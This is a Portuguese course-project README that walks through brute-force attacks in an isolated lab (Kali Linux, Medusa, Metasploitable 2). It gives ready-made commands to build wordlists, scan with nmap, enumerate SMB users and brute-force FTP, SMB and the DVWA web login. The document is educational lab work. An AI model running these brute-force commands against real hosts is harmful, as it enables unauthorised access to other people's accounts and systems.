# Curso_Segurança
Projeto de Segurança: Ataques de Força Bruta com Kali Linux e Medusa
# Introdução
Este projeto foi desenvolvido como parte do curso da DIO, com o objetivo de explorar técnicas de ataques de força bruta em ambientes controlados, 
utilizando Kali Linux, Medusa e Metasploitable 2. O foco é aprender sobre segurança ofensiva e práticas de mitigação.

# Configuração do Ambiente
Ferramentas Utilizadas:
  VirtualBox 7.0
  Kali Linux 2025.1
  Metasploitable 2
Rede: Configurada como Host-Only (`192.168.56.0/24`).
  1. Instalação do VirtualBox e criação da rede host-only.
  2. Configuração das VMs Kali Linux e Metasploitable 2.
  3. Verificação de conectividade com `ping`.

##############################################################################

Feito as configuração do ambiente vamos  começar:

1) Vamos criar words list para senhas e usuários na mão para fim de testes,
mas no mundo real devemos usar words lista mais robustas que podemos encontar facilemnte na internet.

echo -e "admin\nadministrador\nuser\nmsfadmin\nguest" > users.txt
echo -e "password\nadmin\n123456\n12345678\nwelcome\nwelcome123\nmsfadmin\nqwerty123" > passwords.txt

** Observação coloca n para quebra linha vamos usar essas worlds lists para todos os testes
** Para ver as words lists criadas #lees users.txt e less passwords.txt 
 
3) Usar Nmap para listar portar abertas e versões dos sistemas
nmap -sV -p 21,22,139,443,445,80,8080 192.168.56.101
** O nmap tem vários parâmetros para ser explorados como rage de portas, IPs etc. 

4) Realização dos Ataques:

# Servidor FTP
medusa -h 192.168.56.101 -U users.txt -P passwords.txt -M ftp -t 6

# Servidor SMB
enum4linux -U 192.168.56.101 > users.txt ** Este comando enumera os usuários SMB pode ser usado para criar word list
medusa -h 192.168.56.101 -U users.txt -p password -M smbnt

# DVWA
medusa -h 192.168.56.101 -u admin -P passwords.txt -M http -m DIR:/dvwa -m FORM:login.php -m FORM-DATA:"post?username=^USER^&password=^PASS^&Login=Login"
** Devemos ver o funcionamento de cada formulário HTML para ajustar o ataque com a medusa, tem o print para melhor compreensão. 


    
